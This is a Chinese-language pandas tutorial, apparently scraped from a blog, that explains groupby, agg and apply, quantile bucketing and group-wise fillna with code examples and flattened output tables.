假设你想要按key1进行分组，并计算data1列的平均值。实现该功能的方式有很多，而我们这里要用的是：访问data1，并根据key1调用groupby： 12grouped = df['data1'].groupby(df['key1'])grouped &lt;pandas.core.groupby.groupby.SeriesGroupBy object at 0x00000000080736D8&gt; 变量 grouped 是一个 GroupBy 对象。它实际上还没有进行任何计算，只是含有一些有关分组键 df[&#39;key1&#39;] 的中间数据而已。换句话说，该对象已经有了接下来对各分组执行运算所需的一切信息。例如，我们可以调用 GroupBy 的 mean 方法来计算分组平均值： 1grouped.mean() key1 a 0.761376 b 1.001831 Name: data1, dtype: float64 数据（Series）根据分组键进行了聚合，产生了一个新的Series，其索引为key1列中的唯一值。之所以结果中索引的名称为key1，是因为原始DataFrame的列df[‘key1’]就叫这个名字。 使用多个分组字段 12means = df['data1'].groupby([df['key1'], df['key2']]).mean()means key1 key2 a one 0.494255 two 1.295617 b one 2.506938 two -0.503276 Name: data1, dtype: float64 这里，我通过两个键对数据进行了分组，得到的Series具有一个层次化索引（由唯一的键对组成） 1means.unstack() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key2 one two key1 a 0.494255 1.295617 b 2.506938 -0.503276 分组键可以是任何长度适当 （等于要分组数据的长度）的数组： 12345states = np.array(['Ohio', 'California', 'California', 'Ohio', 'Ohio'])years = np.array([2005, 2005, 2006, 2005, 2006])df['data1'].groupby([states, years]).mean() California 2005 1.295617 2006 2.506938 Ohio 2005 0.344843 2006 -0.204452 Name: data1, dtype: float64 通常，分组信息就位于相同的要处理DataFrame中。这里，你还可以将列名（可以是字符串、数字或其他Python对象）用作分组键： 1df.groupby('key1').mean() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } data1 data2 key1 a 0.761376 -0.509753 b 1.001831 -0.826561 1df.groupby(['key1', 'key2']).mean() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } data1 data2 key1 key2 a one 0.494255 -0.454052 two 1.295617 -0.621154 b one 2.506938 -0.954289 two -0.503276 -0.698834 你可能已经注意到了，第一个例子在执行df.groupby(‘key1’).mean()时，结果中没有key2列。这是因为df[‘key2’]不是数值数据（俗称“麻烦列”），所以被从结果中排除了。默认情况下，所有数值列都会被聚合，虽然有时可能会被过滤为一个子集，稍后就会碰到。 无论你准备拿 groupby 做什么，都有可能会用到 GroupBy 的 size 方法，它可以返回一个含有分组大小的 Series： 1df.groupby(['key1', 'key2']).size() key1 key2 a one 2 two 1 b one 1 two 1 dtype: int64 注意，任何分组关键词中的缺失值，都会被从结果中除去。 对分组进行迭代GroupBy对象支持迭代，可以产生一组二元元组（由分组名和数据块组成）。 1df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key1 key2 data1 data2 0 a one 1.192962 -1.675544 1 a two 1.295617 -0.621154 2 b one 2.506938 -0.954289 3 b two -0.503276 -0.698834 4 a one -0.204452 0.767441 123for name, group in df.groupby('key1'): print(name) print(group) a key1 key2 data1 data2 0 a one 1.192962 -1.675544 1 a two 1.295617 -0.621154 4 a one -0.204452 0.767441 b key1 key2 data1 data2 2 b one 2.506938 -0.954289 3 b two -0.503276 -0.698834 对于多重键的情况，元组的第一个元素将会是由键值组成的元组： 123for (k1, k2), group in df.groupby(['key1', 'key2']): print((k1, k2)) print(group) (&apos;a&apos;, &apos;one&apos;) key1 key2 data1 data2 0 a one 1.192962 -1.675544 4 a one -0.204452 0.767441 (&apos;a&apos;, &apos;two&apos;) key1 key2 data1 data2 1 a two 1.295617 -0.621154 (&apos;b&apos;, &apos;one&apos;) key1 key2 data1 data2 2 b one 2.506938 -0.954289 (&apos;b&apos;, &apos;two&apos;) key1 key2 data1 data2 3 b two -0.503276 -0.698834 你可以对这些数据片段做任何操作。有一个你可能会觉得有用的运算：将这些数据片段做成一个字典： 12pieces = dict(list(df.groupby('key1')))pieces['b'] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key1 key2 data1 data2 2 b one 2.506938 -0.954289 3 b two -0.503276 -0.698834 groupby默认是在 axis=0 上进行分组的，通过设置也可以在其他任何轴上进行分组。拿上面例子中的df来说，我们可以根据dtype对列进行分组： 1df.dtypes key1 object key2 object data1 float64 data2 float64 dtype: object 12345# 按照数据类型分组grouped = df.groupby(df.dtypes, axis=1)for dtype, group in grouped: print(dtype) print(group) float64 data1 data2 0 1.192962 -1.675544 1 1.295617 -0.621154 2 2.506938 -0.954289 3 -0.503276 -0.698834 4 -0.204452 0.767441 object key1 key2 0 a one 1 a two 2 b one 3 b two 4 a one 选取一列或列的子集对于由DataFrame产生的GroupBy对象，如果用一个（单个字符串）或一组（字符串数组）列名对其进行索引，就能实现选取部分列进行聚合的目的。12df.groupby(&apos;key1&apos;)[&apos;data1&apos;]df.groupby(&apos;key1&apos;)[[&apos;data2&apos;]] 是以下代码的语法糖：12df[&apos;data1&apos;].groupby(df[&apos;key1&apos;])df[[&apos;data2&apos;]].groupby(df[&apos;key1&apos;]) 尤其对于大数据集，很可能只需要对部分列进行聚合。例如，在前面那个数据集中，如果只需计算data2列的平均值并以DataFrame形式得到结果，可以这样写： 12# 双 [[]] 要生成 dataframedf.groupby(['key1', 'key2'])[['data2']].mean() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } data2 key1 key2 a one -0.454052 two -0.621154 b one -0.954289 two -0.698834 12# 单 [] 要生成 seriesdf.groupby(['key1', 'key2'])['data2'].mean() key1 key2 a one -0.454052 two -0.621154 b one -0.954289 two -0.698834 Name: data2, dtype: float64 通过字典或Series进行分组12345people = pd.DataFrame(np.random.randn(5, 5), columns=['a', 'b', 'c', 'd', 'e'], index=['Joe', 'Steve', 'Wes', 'Jim', 'Travis'])people.iloc[2:3, [1, 2]] = np.nanpeople .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d e Joe 1.259713 -0.377088 0.520075 -0.881195 0.158433 Steve -1.226603 0.648477 -0.317307 0.012993 0.584107 Wes -1.811950 NaN NaN -0.576653 0.362209 Jim 0.951494 0.253198 -0.386507 1.172929 -1.755465 Travis 1.107800 0.297369 -0.279916 1.512150 0.755150 假设已知列的分组关系，并希望根据分组计算列的和： 1mapping = &#123;'a': 'red', 'b': 'red', 'c': 'blue', 'd': 'blue', 'e': 'red', 'f' : 'orange'&#125; 将这个字典传给groupby，来构造数组，但我们可以直接传递字典（我包含了键“f”来强调，存在未使用的分组键是可以的）： 12by_column = people.groupby(mapping, axis=1)by_column.sum() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } blue red Joe -0.361120 1.041059 Steve -0.304314 0.005981 Wes -0.576653 -1.449741 Jim 0.786422 -0.550774 Travis 1.232234 2.160319 Series也有同样的功能，它可以被看做一个固定大小的映射： 12map_series = pd.Series(mapping)map_series a red b red c blue d blue e red f orange dtype: object 1people.groupby(map_series, axis=1).count() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } blue red Joe 2 3 Steve 2 3 Wes 1 2 Jim 2 3 Travis 2 3 通过函数进行分组比起使用字典或Series，使用Python函数是一种更原生的方法定义分组映射。任何被当做分组键的函数都会在各个索引值上被调用一次，其返回值就会被用作分组名称。 1people .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d e Joe 1.259713 -0.377088 0.520075 -0.881195 0.158433 Steve -1.226603 0.648477 -0.317307 0.012993 0.584107 Wes -1.811950 NaN NaN -0.576653 0.362209 Jim 0.951494 0.253198 -0.386507 1.172929 -1.755465 Travis 1.107800 0.297369 -0.279916 1.512150 0.755150 其索引值为人的名字。你可以计算一个字符串长度的数组，更简单的方法是传入 len 函数： 1people.groupby(len).sum() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d e 3 0.399257 -0.123890 0.133568 -0.284919 -1.234823 5 -1.226603 0.648477 -0.317307 0.012993 0.584107 6 1.107800 0.297369 -0.279916 1.512150 0.755150 将函数跟数组、列表、字典、Series混合使用也不是问题，因为任何东西在内部都会被转换为数组： 12key_list = ['one', 'one', 'one', 'two', 'two']people.groupby([len, key_list]).min() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d e 3 one -1.811950 -0.377088 0.520075 -0.881195 0.158433 two 0.951494 0.253198 -0.386507 1.172929 -1.755465 5 one -1.226603 0.648477 -0.317307 0.012993 0.584107 6 two 1.107800 0.297369 -0.279916 1.512150 0.755150 根据索引级别分组层次化索引数据集最方便的地方就在于它能够根据轴索引的一个级别进行聚合： 12345columns = pd.MultiIndex.from_arrays([['US', 'US', 'US', 'JP', 'JP'], [1, 3, 5, 1, 3]], names=['cty', 'tenor'])hier_df = pd.DataFrame(np.random.randn(4, 5), columns=columns)hier_df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } cty US JP tenor 1 3 5 1 3 0 -0.676690 -0.294463 0.275278 -0.315009 -0.454633 1 -1.509024 0.474617 -0.969700 -0.043906 -1.237097 2 0.379676 -0.577742 1.084988 0.499930 0.373462 3 1.097124 -0.437426 0.725242 -1.646882 0.571528 要根据级别分组，使用 level 关键字传递级别序号或名字： 1hier_df.groupby(level='cty', axis=1).count() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } cty JP US 0 2 3 1 2 3 2 2 3 3 2 3 数据聚合聚合指的是任何能够从数组产生标量值的数据转换过程。之前的例子已经用过一些，比如mean、count、min以及sum等。常见的聚合运算 1df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key1 key2 data1 data2 0 a one 1.192962 -1.675544 1 a two 1.295617 -0.621154 2 b one 2.506938 -0.954289 3 b two -0.503276 -0.698834 4 a one -0.204452 0.767441 1grouped = df.groupby('key1') 如果要使用你自己的聚合函数，只需将其传入 aggregate 或 agg 方法即可： 123def peak_to_peak(arr): return arr.max() - arr.min()grouped.agg(peak_to_peak) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } data1 data2 key1 a 1.500069 2.442985 b 3.010214 0.255455 获取分组后的描述信息 1grouped.describe() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } .dataframe thead tr:last-of-type th { text-align: right; } data1 data2 count mean std min 25% 50% 75% max count mean std min 25% 50% 75% max key1 a 3.0 0.761376 0.838004 -0.204452 0.494255 1.192962 1.244290 1.295617 3.0 -0.509753 1.225297 -1.675544 -1.148349 -0.621154 0.073143 0.767441 b 2.0 1.001831 2.128543 -0.503276 0.249277 1.001831 1.754384 2.506938 2.0 -0.826561 0.180634 -0.954289 -0.890425 -0.826561 -0.762697 -0.698834 自定义聚合函数要比图中那些经过优化的函数慢得多。这是因为在构造中间分组数据块时存在非常大的开销（函数调用、数据重排等）。 面向列的多函数应用你可能希望对不同的列使用不同的聚合函数，或一次应用多个函数。其实这也好办，我将通过一些示例来进行讲解。 123tips = pd.read_csv('data/examples/tips.csv')tips['tip_pct'] = tips['tip'] / tips['total_bill']tips.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } total_bill tip smoker day time size tip_pct 0 16.99 1.01 No Sun Dinner 2 0.059447 1 10.34 1.66 No Sun Dinner 3 0.160542 2 21.01 3.50 No Sun Dinner 3 0.166587 3 23.68 3.31 No Sun Dinner 2 0.139780 4 24.59 3.61 No Sun Dinner 4 0.146808 首先，我根据天和smoker对tips进行分组： 1grouped = tips.groupby(['day', 'smoker']) 获取分组后的一列 1grouped_pct = grouped['tip_pct'] 按照指定的方式对这一列分组进行结算 1grouped_pct.agg('mean') day smoker Fri No 0.151650 Yes 0.174783 Sat No 0.158048 Yes 0.147906 Sun No 0.160113 Yes 0.187250 Thur No 0.160298 Yes 0.163863 Name: tip_pct, dtype: float64 如果传入一组函数或函数名，得到的DataFrame的列就会以相应的函数命名： 12# peak_to_peak 是上面自定义的一个方法grouped_pct.agg(['mean', 'std', peak_to_peak]) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } mean std peak_to_peak day smoker Fri No 0.151650 0.028123 0.067349 Yes 0.174783 0.051293 0.159925 Sat No 0.158048 0.039767 0.235193 Yes 0.147906 0.061375 0.290095 Sun No 0.160113 0.042347 0.193226 Yes 0.187250 0.154134 0.644685 Thur No 0.160298 0.038774 0.193350 Yes 0.163863 0.039389 0.151240 你并非一定要接受GroupBy自动给出的那些列名，特别是lambda函数，它们的名称是’’，这样的辨识度就很低了（通过函数的name属性看看就知道了）。因此，如果传入的是一个由(name,function)元组组成的列表，则各元组的第一个元素就会被用作DataFrame的列名（可以将这种二元元组列表看做一个有序映射）： 设置方法的字段别名 1grouped_pct.agg([('foo', 'mean'), ('bar', np.std)]) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } foo bar day smoker Fri No 0.151650 0.028123 Yes 0.174783 0.051293 Sat No 0.158048 0.039767 Yes 0.147906 0.061375 Sun No 0.160113 0.042347 Yes 0.187250 0.154134 Thur No 0.160298 0.038774 Yes 0.163863 0.039389 对于DataFrame，你还有更多选择，你可以定义一组应用于全部列的一组函数，或不同的列应用不同的函数。假设我们想要对tip_pct和total_bill列计算三个统计信息： 12345functions = ['count', 'mean', 'max']result = grouped['tip_pct', 'total_bill'].agg(functions)result .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } .dataframe thead tr:last-of-type th { text-align: right; } tip_pct total_bill count mean max count mean max day smoker Fri No 4 0.151650 0.187735 4 18.420000 22.75 Yes 15 0.174783 0.263480 15 16.813333 40.17 Sat No 45 0.158048 0.291990 45 19.661778 48.33 Yes 42 0.147906 0.325733 42 21.276667 50.81 Sun No 57 0.160113 0.252672 57 20.506667 48.17 Yes 19 0.187250 0.710345 19 24.120000 45.35 Thur No 45 0.160298 0.266312 45 17.113111 41.19 Yes 17 0.163863 0.241255 17 19.190588 43.11 1result['tip_pct'] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } count mean max day smoker Fri No 4 0.151650 0.187735 Yes 15 0.174783 0.263480 Sat No 45 0.158048 0.291990 Yes 42 0.147906 0.325733 Sun No 57 0.160113 0.252672 Yes 19 0.187250 0.710345 Thur No 45 0.160298 0.266312 Yes 17 0.163863 0.241255 跟前面一样，这里也可以传入带有自定义名称的一组元组： 123ftuples = [('Durchschnitt', 'mean'),('Abweichung', np.var)]grouped['tip_pct', 'total_bill'].agg(ftuples) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } .dataframe thead tr:last-of-type th { text-align: right; } tip_pct total_bill Durchschnitt Abweichung Durchschnitt Abweichung day smoker Fri No 0.151650 0.000791 18.420000 25.596333 Yes 0.174783 0.002631 16.813333 82.562438 Sat No 0.158048 0.001581 19.661778 79.908965 Yes 0.147906 0.003767 21.276667 101.387535 Sun No 0.160113 0.001793 20.506667 66.099980 Yes 0.187250 0.023757 24.120000 109.046044 Thur No 0.160298 0.001503 17.113111 59.625081 Yes 0.163863 0.001551 19.190588 69.808518 现在，假设你想要对一个列或不同的列应用不同的函数。具体的办法是向agg传入一个从列名映射到函数的字典： 12# 分组后，对 tip 列进行 np.max 运算； size 列进行 sum 运算grouped.agg(&#123;'tip' : np.max, 'size' : 'sum'&#125;) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } tip size day smoker Fri No 3.50 9 Yes 4.73 31 Sat No 9.00 115 Yes 10.00 104 Sun No 6.00 167 Yes 6.50 49 Thur No 6.70 112 Yes 5.00 40 12# 分组后，对 tip_pct 列分别进行 多种 运算； size 列进行 sum 运算grouped.agg(&#123;'tip_pct' : ['min', 'max', 'mean', 'std'], 'size' : 'sum'&#125;) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } .dataframe thead tr:last-of-type th { text-align: right; } tip_pct size min max mean std sum day smoker Fri No 0.120385 0.187735 0.151650 0.028123 9 Yes 0.103555 0.263480 0.174783 0.051293 31 Sat No 0.056797 0.291990 0.158048 0.039767 115 Yes 0.035638 0.325733 0.147906 0.061375 104 Sun No 0.059447 0.252672 0.160113 0.042347 167 Yes 0.065660 0.710345 0.187250 0.154134 49 Thur No 0.072961 0.266312 0.160298 0.038774 112 Yes 0.090014 0.241255 0.163863 0.039389 40 只有将多个函数应用到至少一列时，DataFrame才会拥有层次化的列。 以“没有行索引”的形式返回聚合数据默认返回的数据是带分组索引的 1tips.groupby(['day', 'smoker']).mean() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } total_bill tip size tip_pct day smoker Fri No 18.420000 2.812500 2.250000 0.151650 Yes 16.813333 2.714000 2.066667 0.174783 Sat No 19.661778 3.102889 2.555556 0.158048 Yes 21.276667 2.875476 2.476190 0.147906 Sun No 20.506667 3.167895 2.929825 0.160113 Yes 24.120000 3.516842 2.578947 0.187250 Thur No 17.113111 2.673778 2.488889 0.160298 Yes 19.190588 3.030000 2.352941 0.163863 可以向 groupby 传入 as_index=False 以禁用该功能 1tips.groupby(['day', 'smoker'], as_index=False).mean() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } day smoker total_bill tip size tip_pct 0 Fri No 18.420000 2.812500 2.250000 0.151650 1 Fri Yes 16.813333 2.714000 2.066667 0.174783 2 Sat No 19.661778 3.102889 2.555556 0.158048 3 Sat Yes 21.276667 2.875476 2.476190 0.147906 4 Sun No 20.506667 3.167895 2.929825 0.160113 5 Sun Yes 24.120000 3.516842 2.578947 0.187250 6 Thur No 17.113111 2.673778 2.488889 0.160298 7 Thur Yes 19.190588 3.030000 2.352941 0.163863 apply：一般性的“拆分－应用－合并”apply会将待处理的对象拆分成多个片段，然后对各片段调用传入的函数，最后尝试将各片段组合到一起。 1tips.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } total_bill tip smoker day time size tip_pct 0 16.99 1.01 No Sun Dinner 2 0.059447 1 10.34 1.66 No Sun Dinner 3 0.160542 2 21.01 3.50 No Sun Dinner 3 0.166587 3 23.68 3.31 No Sun Dinner 2 0.139780 4 24.59 3.61 No Sun Dinner 4 0.146808 假设你想要根据分组选出最高的5个tip_pct值。首先，编写一个选取指定列具有最大值的行的函数： 123def top(df, n=5, column='tip_pct'): return df.sort_values(by=column)[-n:]top(tips, n = 6) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } total_bill tip smoker day time size tip_pct 109 14.31 4.00 Yes Sat Dinner 2 0.279525 183 23.17 6.50 Yes Sun Dinner 4 0.280535 232 11.61 3.39 No Sat Dinner 2 0.291990 67 3.07 1.00 Yes Sat Dinner 1 0.325733 178 9.60 4.00 Yes Sun Dinner 2 0.416667 172 7.25 5.15 Yes Sun Dinner 2 0.710345 如果对smoker分组并用该函数调用apply，就会得到： 1tips.groupby('smoker').apply(top) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } total_bill tip smoker day time size tip_pct smoker No 88 24.71 5.85 No Thur Lunch 2 0.236746 185 20.69 5.00 No Sun Dinner 5 0.241663 51 10.29 2.60 No Sun Dinner 2 0.252672 149 7.51 2.00 No Thur Lunch 2 0.266312 232 11.61 3.39 No Sat Dinner 2 0.291990 Yes 109 14.31 4.00 Yes Sat Dinner 2 0.279525 183 23.17 6.50 Yes Sun Dinner 4 0.280535 67 3.07 1.00 Yes Sat Dinner 1 0.325733 178 9.60 4.00 Yes Sun Dinner 2 0.416667 172 7.25 5.15 Yes Sun Dinner 2 0.710345 top函数在DataFrame的各个片段上调用，然后结果由pandas.concat组装到一起，并以分组名称进行了标记。于是，最终结果就有了一个层次化索引，其内层索引值来自原DataFrame。 如果传给apply的函数能够接受其他参数或关键字，则可以将这些内容放在函数名后面一并传入： 1tips.groupby(['smoker', 'day']).apply(top, n=1, column='total_bill') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } total_bill tip smoker day time size tip_pct smoker day No Fri 94 22.75 3.25 No Fri Dinner 2 0.142857 Sat 212 48.33 9.00 No Sat Dinner 4 0.186220 Sun 156 48.17 5.00 No Sun Dinner 6 0.103799 Thur 142 41.19 5.00 No Thur Lunch 5 0.121389 Yes Fri 95 40.17 4.73 Yes Fri Dinner 4 0.117750 Sat 170 50.81 10.00 Yes Sat Dinner 3 0.196812 Sun 182 45.35 3.50 Yes Sun Dinner 3 0.077178 Thur 197 43.11 5.00 Yes Thur Lunch 4 0.115982 在GroupBy中，当你调用诸如describe之类的方法时，实际上只是应用了下面两条代码的快捷方式而已： 12result = tips.groupby('smoker')['tip_pct'].describe()result .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } count mean std min 25% 50% 75% max smoker No 151.0 0.159328 0.039910 0.056797 0.136906 0.155625 0.185014 0.291990 Yes 93.0 0.163196 0.085119 0.035638 0.106771 0.153846 0.195059 0.710345 1result.unstack('smoker') smoker count No 151.000000 Yes 93.000000 mean No 0.159328 Yes 0.163196 std No 0.039910 Yes 0.085119 min No 0.056797 Yes 0.035638 25% No 0.136906 Yes 0.106771 50% No 0.155625 Yes 0.153846 75% No 0.185014 Yes 0.195059 max No 0.291990 Yes 0.710345 dtype: float64 1result.unstack('smoker').swaplevel(0, 1) smoker No count 151.000000 Yes count 93.000000 No mean 0.159328 Yes mean 0.163196 No std 0.039910 Yes std 0.085119 No min 0.056797 Yes min 0.035638 No 25% 0.136906 Yes 25% 0.106771 No 50% 0.155625 Yes 50% 0.153846 No 75% 0.185014 Yes 75% 0.195059 No max 0.291990 Yes max 0.710345 dtype: float64 applay 的实现方式 12f = lambda x: x.describe()tips.groupby('smoker')['tip_pct'].apply(f) smoker No count 151.000000 mean 0.159328 std 0.039910 min 0.056797 25% 0.136906 50% 0.155625 75% 0.185014 max 0.291990 Yes count 93.000000 mean 0.163196 std 0.085119 min 0.035638 25% 0.106771 50% 0.153846 75% 0.195059 max 0.710345 Name: tip_pct, dtype: float64 禁止分组键分组键会跟原始对象的索引共同构成结果对象中的层次化索引。将 group_keys=False 传入 groupby 即可禁止该效果： 1tips.groupby('smoker').apply(top) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } total_bill tip smoker day time size tip_pct smoker No 88 24.71 5.85 No Thur Lunch 2 0.236746 185 20.69 5.00 No Sun Dinner 5 0.241663 51 10.29 2.60 No Sun Dinner 2 0.252672 149 7.51 2.00 No Thur Lunch 2 0.266312 232 11.61 3.39 No Sat Dinner 2 0.291990 Yes 109 14.31 4.00 Yes Sat Dinner 2 0.279525 183 23.17 6.50 Yes Sun Dinner 4 0.280535 67 3.07 1.00 Yes Sat Dinner 1 0.325733 178 9.60 4.00 Yes Sun Dinner 2 0.416667 172 7.25 5.15 Yes Sun Dinner 2 0.710345 1tips.groupby('smoker', group_keys=False).apply(top) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } total_bill tip smoker day time size tip_pct 88 24.71 5.85 No Thur Lunch 2 0.236746 185 20.69 5.00 No Sun Dinner 5 0.241663 51 10.29 2.60 No Sun Dinner 2 0.252672 149 7.51 2.00 No Thur Lunch 2 0.266312 232 11.61 3.39 No Sat Dinner 2 0.291990 109 14.31 4.00 Yes Sat Dinner 2 0.279525 183 23.17 6.50 Yes Sun Dinner 4 0.280535 67 3.07 1.00 Yes Sat Dinner 1 0.325733 178 9.60 4.00 Yes Sun Dinner 2 0.416667 172 7.25 5.15 Yes Sun Dinner 2 0.710345 分位数和桶分析pandas有一些能根据指定面元或样本分位数将数据拆分成多块的工具（比如cut和qcut）。将这些函数跟groupby结合起来，就能非常轻松地实现对数据集的桶（bucket）或分位数（quantile）分析了。以下面这个简单的随机数据集为例，我们利用cut将其装入长度相等的桶中： 1234frame = pd.DataFrame(&#123;'data1': np.random.randn(1000), 'data2': np.random.randn(1000)&#125;)quartiles = pd.cut(frame.data1, 4)quartiles.head() 0 (-1.698, 0.0798] 1 (0.0798, 1.857] 2 (-1.698, 0.0798] 3 (0.0798, 1.857] 4 (-1.698, 0.0798] Name: data1, dtype: category Categories (4, interval[float64]): [(-3.482, -1.698] &lt; (-1.698, 0.0798] &lt; (0.0798, 1.857] &lt; (1.857, 3.635]] 由cut返回的Categorical对象可直接传递到groupby。因此，我们可以像下面这样对data2列做一些统计计算： 12345def get_stats(group): return &#123;'min': group.min(), 'max': group.max(), 'count': group.count(), 'mean': group.mean()&#125;grouped = frame.data2.groupby(quartiles)grouped.apply(get_stats).unstack() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } count max mean min data1 (-3.482, -1.698] 38.0 2.161012 0.286213 -1.820655 (-1.698, 0.0798] 472.0 3.762126 -0.044402 -3.260810 (0.0798, 1.857] 452.0 3.026034 -0.040110 -3.122991 (1.857, 3.635] 38.0 1.482856 -0.191989 -1.969943 这些都是长度相等的桶。要根据样本分位数得到大小相等的桶，使用qcut即可。传入 labels=False 即可只获取分位数的编号： 12grouping = pd.qcut(frame.data1, 10, labels=False)grouping.head() 0 1 1 5 2 3 3 5 4 3 Name: data1, dtype: int64 12temp = pd.qcut(frame.data1, 10)temp.head() 0 (-1.261, -0.827] 1 (0.0684, 0.326] 2 (-0.476, -0.193] 3 (0.0684, 0.326] 4 (-0.476, -0.193] Name: data1, dtype: category Categories (10, interval[float64]): [(-3.476, -1.261] &lt; (-1.261, -0.827] &lt; (-0.827, -0.476] &lt; (-0.476, -0.193] ... (0.326, 0.596] &lt; (0.596, 0.925] &lt; (0.925, 1.368] &lt; (1.368, 3.635]] 12grouped = frame.data2.groupby(grouping)grouped.apply(get_stats).unstack() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } count max mean min data1 0 100.0 2.621324 0.070152 -2.179777 1 100.0 2.462273 -0.049077 -2.289337 2 100.0 3.762126 -0.077355 -3.260810 3 100.0 2.707121 0.016885 -2.551321 4 100.0 1.805644 -0.043425 -2.499053 5 100.0 2.079105 -0.021532 -2.564312 6 100.0 3.026034 -0.123689 -3.122991 7 100.0 2.220393 -0.105029 -2.630459 8 100.0 2.454573 -0.046064 -2.195948 9 100.0 2.476637 0.024066 -2.050193 示例：用特定于分组的值填充缺失值对于缺失数据的清理工作，有时你会用dropna将其替换掉，而有时则可能会希望用一个固定值或由数据集本身所衍生出来的值去填充NA值。这时就得使用fillna这个工具了。在下面这个例子中，我用平均值去填充NA值： 123s = pd.Series(np.random.randn(6))s[::2] = np.nans 0 NaN 1 -1.698228 2 NaN 3 0.250362 4 NaN 5 -0.981594 dtype: float64 1s.fillna(s.mean()) 0 -0.809820 1 -1.698228 2 -0.809820 3 0.250362 4 -0.809820 5 -0.981594 dtype: float64 假设你需要对不同的分组填充不同的值。一种方法是将数据分组，并使用apply和一个能够对各数据块调用fillna的函数即可。 12345states = ['Ohio', 'New York', 'Vermont', 'Florida', 'Oregon', 'Nevada', 'California', 'Idaho']group_key = ['East'] * 4 + ['West'] * 4group_key [&apos;East&apos;, &apos;East&apos;, &apos;East&apos;, &apos;East&apos;, &apos;West&apos;, &apos;West&apos;, &apos;West&apos;, &apos;West&apos;] 12data = pd.Series(np.random.randn(8), index=states)data Ohio -0.343101 New York 1.024389 Vermont 1.311144 Florida -0.423204 Oregon 0.114283 Nevada -1.089131 California -1.727345 Idaho -0.830830 dtype: float64 12data[['Vermont', 'Nevada', 'Idaho']] = np.nandata Ohio -0.343101 New York 1.024389 Vermont NaN Florida -0.423204 Oregon 0.114283 Nevada NaN California -1.727345 Idaho NaN dtype: float64 1data.groupby(group_key).mean() East 0.086028 West -0.806531 dtype: float64 我们可以用分组平均值去填充NA值: 123fill_mean = lambda g: g.fillna(g.mean())data.groupby(group_key).apply(fill_mean) Ohio -0.343101 New York 1.024389 Vermont 0.086028 Florida -0.423204 Oregon 0.114283 Nevada -0.806531 California -1.727345 Idaho -0.806531 dtype: float64 